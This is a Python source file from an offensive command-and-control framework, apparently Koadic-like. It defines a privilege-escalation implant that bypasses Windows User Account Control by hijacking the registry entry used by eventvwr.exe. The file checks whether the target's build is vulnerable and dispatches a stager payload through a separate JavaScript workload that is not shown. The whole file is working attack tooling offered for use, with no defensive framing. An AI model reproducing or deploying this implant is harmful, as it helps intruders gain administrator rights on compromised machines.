import core.job
import core.implant
import uuid

class EventVwrJob(core.job.Job):
    def create(self):
        id = self.options.get("STAGER")
        payload = self.load_payload(id)
        self.options.set("STAGER_DATA", payload)
        if self.session_id == -1:
            return
        if (int(self.session.build) < 7600 or int(self.session.build) > 15030) and self.options.get("IGNOREBUILD") == "false":
            self.error("0", "The target may not be vulnerable to this implant. Set IGNOREBUILD to true to run anyway.", "Target build not vulnerable.", "")
            return False

    def done(self):
        self.display()

    def display(self):
        self.results = "Completed!"
        #self.shell.print_plain(self.data)

class EventVwrImplant(core.implant.Implant):

    NAME = "Bypass UAC EventVwr"
    DESCRIPTION = "Bypass UAC via registry hijack for eventvwr.exe. Drops no files to disk."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/elevate/bypassuac_eventvwr"

    def load(self):
        self.options.register("STAGER", "", "Run stagers for a list of IDs.")
        self.options.register("STAGER_DATA", "", "The actual data.", hidden=True)

    def job(self):
        return EventVwrJob

    def run(self):
        id = self.options.get("STAGER")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("No such stager!")
            return

        workloads = {}
        workloads["js"] = "data/implant/elevate/bypassuac_eventvwr.js"

        self.dispatch(workloads, self.job)
